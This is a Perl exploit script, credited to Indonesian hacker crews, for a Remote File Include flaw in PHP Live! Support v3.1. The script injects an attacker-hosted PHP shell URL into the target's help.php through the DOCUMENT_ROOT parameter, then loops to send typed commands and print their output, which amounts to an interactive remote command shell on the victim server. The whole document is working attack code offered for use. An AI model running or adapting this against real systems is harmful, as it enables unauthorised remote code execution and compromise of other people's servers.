#!/usr/bin/perl

use HTTP::Request;
use LWP::UserAgent;
$RoNz = $ARGV[0];
$Pathloader = $ARGV[1];
$Contrex = $ARGV[2];
if($RoNz!~/http:\/\// || $Pathloader!~/http:\/\// || !$Contrex){usage()}
head();
sub head()
 {
 print "[o]============================================================================[o]\r\n";
 print " |	       PHP Live! Support v3.1 Multiple Remote File Include	   	|\r\n";
 print "[o]============================================================================[o]\r\n";
 }
while()
{
      print "[w00t] \$";
while(<STDIN>)
      {
              $kaMtiEz=$_;
              chomp($kaMtiEz);
$arianom = LWP::UserAgent->new() or die;
$tiw0L = HTTP::Request->new(GET =>$RoNz.'help.php?DOCUMENT_ROOT='.$Pathloader.'?&'.$Contrex.'='.$kaMtiEz)or die "\nCould Not connect\n";
$abah_benu = $arianom->request($tiw0L);
$tukulesto = $abah_benu->content;
$tukulesto =~ tr/[\n]/[?]/;
if (!$kaMtiEz) {print "\nPlease Enter a Command\n\n"; $tukulesto ="";}
elsif ($tukulesto =~/failed to open stream: HTTP request denied!/ || $tukulesto =~/: Cannot execute a blank command in /)
      {print "\nCann't Connect to cmd Host or Invalid Command\n";exit}
elsif ($tukulesto =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}
if($tukulesto =~ /(.*)/)
{
      $finreturn = $1;
      $finreturn=~ tr/[?]/[\n]/;
      print "\r\n$finreturn\n\r";
      last;
}
else {print "[w00t] \$";}}}last;
sub usage()
 {
 head();
 print " | Usage:  perl tux.pl <target> <weapon url> <cmd>				|\r\n";
 print " | <Site> - Full path to execute ex: http://127.0.0.1/path/			|\r\n";
 print " | <Weapon url> - Path to Shell e.g http://www.indonesiancoder.org/shell.txt	|\r\n";
 print " | <cmd> - Command variable used in php shell					|\r\n";
 print "[o]============================================================================[o]\r\n";
 print " | 	IndonesianCoder Team | KILL-9 CREW | ServerIsDown | AntiSecurity.org    |\r\n";
 print " |   kaMtiEz, M3NW5, arianom, tiw0L, Pathloader, abah_benu, VycOd, Gh4mb4S      |\r\n";
 print " | M364TR0N, TUCKER, Ian Petrucii, kecemplungkalen, NoGe, bh4nd55, MainHack.Net |\r\n";
 print " |  Jack-, Contrex, yadoy666, Ronz, noname, s4va, gonzhack, cyb3r_tron, saint   |\r\n";
 print " |    Awan Bejat, Plaque, rey_cute, BennyCooL, SurabayaHackerLink Team and YOU! |\r\n";
 print "[o]============================================================================[o]\r\n";
 print " |	http://www.IndonesianCoder.org	   |	http://www.AntiSecRadio.fm 	|\r\n";
 print "[o]============================================================================[o]\r\n";
 exit();
 }